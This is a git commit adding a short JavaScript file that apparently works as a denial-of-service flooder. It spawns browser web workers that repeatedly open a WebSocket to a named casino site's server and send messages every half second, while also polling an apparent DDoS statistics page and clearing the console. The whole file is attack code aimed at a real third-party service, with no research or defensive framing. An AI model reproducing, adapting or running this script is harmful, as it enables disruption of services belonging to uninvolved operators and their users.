a90ede8d0f81a76d83a815ce5a9f24c42813d881
a1 <trctrw@proton.me>
2025-07-23 12:14:21 +0800

    Add files via upload

---
+++ fuckbing1o.js
@@ -0,0 +1,55 @@
+
+
+
+
+
+const workerCode = `
+
+setInterval(async function () {
+    try {
+        await fetch('https://layer7.wiki/dstat/');
+        console.clear()
+        console.log('console cleared by v1.js')
+    } catch (e) { }
+}, 500);
+  let socket = null;
+  let interval = null;
+
+  onmessage = function(e) {
+    const index = e.data.index ?? 0;
+    const url = 'wss://cp-ws.casinoplus.top/websocket';
+
+    socket = new WebSocket(url);
+
+    socket.onopen = function() {
+      console.log('Worker ' + index + ' connected');
+
+      interval = setInterval(() => {
+        if (socket.readyState === WebSocket.OPEN) {
+          socket.send(JSON.stringify({ test: 1 }));
+        }
+      }, 500);
+    };
+
+    socket.onerror = function(err) {
+      console.error('Worker ' + index + ' WebSocket error:', err);
+    };
+
+    socket.onclose = function() {
+      console.warn('Worker ' + index + ' WebSocket closed');
+      clearInterval(interval);
+    };
+
+    socket.onmessage = function(event) {
+
+    };
+  };
+`;
+
+const blob = new Blob([workerCode], { type: 'application/javascript' });
+const workerUrl = URL.createObjectURL(blob);
+
+for (let i = 0; i < 3; i++) {
+    const worker = new Worker(workerUrl);
+    worker.postMessage({ index: i });
+}
